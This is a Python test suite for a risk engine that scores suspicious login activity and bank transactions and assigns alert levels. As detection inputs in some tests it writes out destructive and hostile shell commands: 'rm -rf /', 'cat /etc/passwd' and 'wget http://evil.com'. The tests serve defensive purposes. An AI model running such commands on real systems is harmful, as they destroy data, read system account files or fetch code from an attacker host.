
import sys
from pathlib import Path
from unittest.mock import patch

#  Make sure project root is on the path so we can import engine modules
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from engine.activity_detector import analyse, _parse_hour, _is_odd_hour, _clamp as act_clamp
from engine.transaction_scorer import score, _clamp as tx_clamp
from engine.risk_engine import evaluate, _assign_level, RiskResult



# Helpers — reusable clean event templates


def clean_activity_event(**overrides) -> dict:
    """A baseline activity event that should trigger zero flags."""
    base = {
        "username":      "testuser",
        "ip_address":    "192.168.1.1",   # in KNOWN_IPS
        "timestamp":     "2024-11-01T10:00:00",
        "failed_logins": 0,
        "command":       "ls -la",
    }
    return {**base, **overrides}


def clean_transaction_event(**overrides) -> dict:
    """A baseline transaction event that should trigger zero flags."""
    base = {
        "account_id":      "ACC-TEST",
        "amount":          100.00,
        "currency":        "ZAR",
        "location":        "Johannesburg",
        "last_location":   "Johannesburg",
        "device_id":       "device-known",
        "known_devices":   ["device-known"],
        "recent_tx_count": 1,
        "timestamp":       "2024-11-01T10:00:00",
    }
    return {**base, **overrides}


def zero_activity() -> dict:
    return {"activity_score": 0, "reasons": []}


def zero_transaction() -> dict:
    return {"transaction_score": 0, "reasons": []}



# activity_detector tests


class TestActivityDetector:

    def test_clean_event_scores_zero(self):
        result = analyse(clean_activity_event())
        assert result["activity_score"] == 0
        assert result["reasons"] == []

    # Failed logins 

    # Failed logins

    def test_failed_logins_at_threshold_no_flag(self):
        """Exactly 5 failed logins should NOT trigger (rule is > 5)."""
        result = analyse(clean_activity_event(failed_logins=5))
        assert result["activity_score"] == 0

    def test_failed_logins_over_threshold_triggers(self):
        result = analyse(clean_activity_event(failed_logins=6))
        assert result["activity_score"] == 30
        assert any("failed logins" in r.lower() for r in result["reasons"])

    def test_failed_logins_high_count(self):
        result = analyse(clean_activity_event(failed_logins=50))
        assert result["activity_score"] == 30
        assert len(result["reasons"]) == 1

    # Odd hours

    def test_odd_hour_midnight_triggers(self):
        result = analyse(clean_activity_event(timestamp="2024-11-01T00:30:00"))
        assert result["activity_score"] == 15
        assert any("hour" in r.lower() for r in result["reasons"])

    def test_odd_hour_4am_triggers(self):
        result = analyse(clean_activity_event(timestamp="2024-11-01T04:59:00"))
        assert result["activity_score"] == 15

    def test_odd_hour_5am_does_not_trigger(self):
        """05:00 is the boundary — should NOT flag."""
        result = analyse(clean_activity_event(timestamp="2024-11-01T05:00:00"))
        assert result["activity_score"] == 0

    def test_normal_hour_no_flag(self):
        result = analyse(clean_activity_event(timestamp="2024-11-01T14:00:00"))
        assert result["activity_score"] == 0

    def test_bad_timestamp_does_not_crash(self):
        """Unparseable timestamp should be silently ignored, not crash."""
        result = analyse(clean_activity_event(timestamp="not-a-date"))
        assert isinstance(result["activity_score"], int)

    def test_missing_timestamp_does_not_crash(self):
        result = analyse(clean_activity_event(timestamp=""))
        assert isinstance(result["activity_score"], int)

    # Unknown IP

    def test_unknown_ip_triggers(self):
        result = analyse(clean_activity_event(ip_address="203.0.113.99"))
        assert result["activity_score"] == 25
        assert any("ip" in r.lower() for r in result["reasons"])

    def test_known_ip_no_flag(self):
        result = analyse(clean_activity_event(ip_address="127.0.0.1"))
        assert result["activity_score"] == 0

    # Suspicious commands

    def test_suspicious_command_rm_rf(self):
        result = analyse(clean_activity_event(command="rm -rf /tmp/data"))
        assert result["activity_score"] == 30

    def test_suspicious_command_passwd(self):
        result = analyse(clean_activity_event(command="cat /etc/passwd"))
        assert result["activity_score"] == 30

    def test_suspicious_command_case_insensitive(self):
        result = analyse(clean_activity_event(command="WGET http://example.com"))
        assert result["activity_score"] == 30

    def test_normal_command_no_flag(self):
        result = analyse(clean_activity_event(command="python manage.py runserver"))
        assert result["activity_score"] == 0

    # Score clamping

    def test_all_signals_clamped_to_100(self):
        """All 4 signals = 30+15+25+30 = 100. Should be exactly 100, not over."""
        result = analyse({
            "username":      "attacker",
            "ip_address":    "9.9.9.9",
            "timestamp":     "2024-11-01T02:00:00",
            "failed_logins": 99,
            "command":       "rm -rf /",
        })
        assert result["activity_score"] == 100

    def test_score_never_negative(self):
        assert act_clamp(-50) == 0

    def test_score_never_over_100(self):
        assert act_clamp(999) == 100



# transaction_scorer tests


class TestTransactionScorer:

    def test_clean_transaction_scores_zero(self):
        result = score(clean_transaction_event())
        assert result["transaction_score"] == 0
        assert result["reasons"] == []

    # High amount

    def test_high_amount_triggers(self):
        result = score(clean_transaction_event(amount=15_000.00))
        assert result["transaction_score"] == 25
        assert any("high-value" in r.lower() for r in result["reasons"])

    def test_amount_at_threshold_no_flag(self):
        """Exactly 10 000 should NOT flag — rule is strictly greater than."""
        result = score(clean_transaction_event(amount=10_000.00))
        assert result["transaction_score"] == 0

    def test_amount_just_over_threshold_flags(self):
        result = score(clean_transaction_event(amount=10_000.01))
        assert result["transaction_score"] == 25

    # Rapid transactions

    def test_rapid_tx_triggers(self):
        result = score(clean_transaction_event(recent_tx_count=3))
        assert result["transaction_score"] == 30

    def test_rapid_tx_below_threshold_no_flag(self):
        result = score(clean_transaction_event(recent_tx_count=2))
        assert result["transaction_score"] == 0

    # Location mismatch

    def test_location_mismatch_triggers(self):
        result = score(clean_transaction_event(
            location="Durban",
            last_location="Johannesburg"
        ))
        assert result["transaction_score"] == 25
        assert any("location" in r.lower() for r in result["reasons"])

    def test_same_location_no_flag(self):
        result = score(clean_transaction_event(
            location="Cape Town",
            last_location="Cape Town"
        ))
        assert result["transaction_score"] == 0

    def test_location_case_insensitive(self):
        """'johannesburg' and 'Johannesburg' should be treated as the same."""
        result = score(clean_transaction_event(
            location="johannesburg",
            last_location="Johannesburg"
        ))
        assert result["transaction_score"] == 0

    def test_missing_last_location_no_flag(self):
        """No previous location means we can't flag a mismatch."""
        result = score(clean_transaction_event(last_location=""))
        assert result["transaction_score"] == 0

    # New device

    def test_new_device_triggers(self):
        result = score(clean_transaction_event(
            device_id="device-new",
            known_devices=["device-old"]
        ))
        assert result["transaction_score"] == 20
        assert any("device" in r.lower() for r in result["reasons"])

    def test_known_device_no_flag(self):
        result = score(clean_transaction_event(
            device_id="device-known",
            known_devices=["device-known"]
        ))
        assert result["transaction_score"] == 0

    def test_empty_known_devices_triggers(self):
        result = score(clean_transaction_event(
            device_id="device-abc",
            known_devices=[]
        ))
        assert result["transaction_score"] == 20

    # All signals + clamping 

    def test_all_signals_score_100(self):
        """25+30+25+20 = 100. Should hit exactly 100."""
        result = score(clean_transaction_event(
            amount=99_999.00,
            recent_tx_count=5,
            location="London",
            last_location="Johannesburg",
            device_id="device-evil",
            known_devices=[]
        ))
        assert result["transaction_score"] == 100
        assert len(result["reasons"]) == 4

    def test_score_never_negative(self):
        assert tx_clamp(-10) == 0

    def test_score_never_over_100(self):
        assert tx_clamp(200) == 100



# risk_engine tests


class TestRiskEngine:

    # Patch _persist so tests never touch the database
    def _evaluate(self, activity, transaction, context=None):
        with patch("engine.risk_engine._persist"):
            return evaluate(activity, transaction, context=context)

    # Alert level assignment

    def test_assign_level_low(self):
        assert _assign_level(0)  == "LOW"
        assert _assign_level(24) == "LOW"

    def test_assign_level_medium(self):
        assert _assign_level(25) == "MEDIUM"
        assert _assign_level(49) == "MEDIUM"

    def test_assign_level_high(self):
        assert _assign_level(50) == "HIGH"
        assert _assign_level(74) == "HIGH"

    def test_assign_level_critical(self):
        assert _assign_level(75)  == "CRITICAL"
        assert _assign_level(100) == "CRITICAL"

    # Score blending

    def test_zero_both_scores_zero(self):
        result = self._evaluate(zero_activity(), zero_transaction())
        assert result.risk_score == 0
        assert result.alert_level == "LOW"

    def test_activity_only_blended_correctly(self):
        """activity=100, transaction=0 → 100*0.55 + 0*0.45 = 55 → HIGH"""
        result = self._evaluate(
            {"activity_score": 100, "reasons": ["test"]},
            zero_transaction()
        )
        assert result.risk_score == 55
        assert result.alert_level == "HIGH"

    def test_transaction_only_blended_correctly(self):
        """activity=0, transaction=100 → 0*0.55 + 100*0.45 = 45 → MEDIUM"""
        result = self._evaluate(
            zero_activity(),
            {"transaction_score": 100, "reasons": ["test"]}
        )
        assert result.risk_score == 45
        assert result.alert_level == "MEDIUM"

    def test_both_detectors_fire_critical(self):
        """activity=100, transaction=100 → 100 → CRITICAL. Most important test."""
        result = self._evaluate(
            {"activity_score": 100, "reasons": ["activity flag"]},
            {"transaction_score": 100, "reasons": ["transaction flag"]}
        )
        assert result.risk_score == 100
        assert result.alert_level == "CRITICAL"

    # Reasons merged correctly

    def test_reasons_from_both_detectors_combined(self):
        result = self._evaluate(
            {"activity_score": 30, "reasons": ["Failed logins"]},
            {"transaction_score": 25, "reasons": ["High-value transaction"]}
        )
        assert "Failed logins" in result.reasons
        assert "High-value transaction" in result.reasons
        assert len(result.reasons) == 2

    def test_no_reasons_returns_empty_list(self):
        result = self._evaluate(zero_activity(), zero_transaction())
        assert result.reasons == []

    # Result structure

    def test_result_has_incident_id(self):
        result = self._evaluate(zero_activity(), zero_transaction())
        assert result.incident_id
        assert len(result.incident_id) == 36   # UUID format

    def test_result_has_timestamp(self):
        result = self._evaluate(zero_activity(), zero_transaction())
        assert result.timestamp
        assert "T" in result.timestamp   # ISO-8601

    def test_context_username_and_ip_stored(self):
        result = self._evaluate(
            zero_activity(),
            zero_transaction(),
            context={"username": "keletso", "ip_address": "10.0.0.1"}
        )
        assert result.username == "keletso"
        assert result.ip_address == "10.0.0.1"

    def test_missing_context_uses_defaults(self):
        result = self._evaluate(zero_activity(), zero_transaction(), context=None)
        assert result.username == "unknown"
        assert result.ip_address == "unknown"

    def test_to_dict_returns_dict(self):
        result = self._evaluate(zero_activity(), zero_transaction())
        d = result.to_dict()
        assert isinstance(d, dict)
        assert "risk_score" in d
        assert "alert_level" in d
        assert "reasons" in d

    # Score is always valid 

    def test_risk_score_always_0_to_100(self):
        for act in [0, 50, 100]:
            for tx in [0, 50, 100]:
                result = self._evaluate(
                    {"activity_score": act, "reasons": []},
                    {"transaction_score": tx, "reasons": []}
                )
                assert 0 <= result.risk_score <= 100



# Integration test — full pipeline, no DB


class TestFullPipeline:

    def _run(self, activity_event, transaction_event, context=None):
        from engine.activity_detector import analyse
        from engine.transaction_scorer import score as tx_score
        with patch("engine.risk_engine._persist"):
            return evaluate(
                analyse(activity_event),
                tx_score(transaction_event),
                context=context,
            )

    def test_clean_pipeline_low_alert(self):
        result = self._run(clean_activity_event(), clean_transaction_event())
        assert result.alert_level == "LOW"
        assert result.risk_score == 0

    def test_suspicious_activity_pipeline(self):
        result = self._run(
            clean_activity_event(
                ip_address="9.9.9.9",
                timestamp="2024-11-01T02:00:00",
                failed_logins=10,
                command="wget http://evil.com",
            ),
            clean_transaction_event(),
        )
        assert result.alert_level in ("HIGH", "CRITICAL")
        assert result.activity_score == 100

    def test_both_detectors_pipeline_critical(self):
        result = self._run(
            clean_activity_event(
                ip_address="9.9.9.9",
                timestamp="2024-11-01T02:00:00",
                failed_logins=10,
                command="rm -rf /",
            ),
            clean_transaction_event(
                amount=50_000,
                recent_tx_count=5,
                location="London",
                last_location="Johannesburg",
                device_id="device-new",
                known_devices=[],
            ),
        )
        assert result.alert_level == "CRITICAL"
        assert result.risk_score == 100
        assert len(result.reasons) == 8   # all 8 flags fired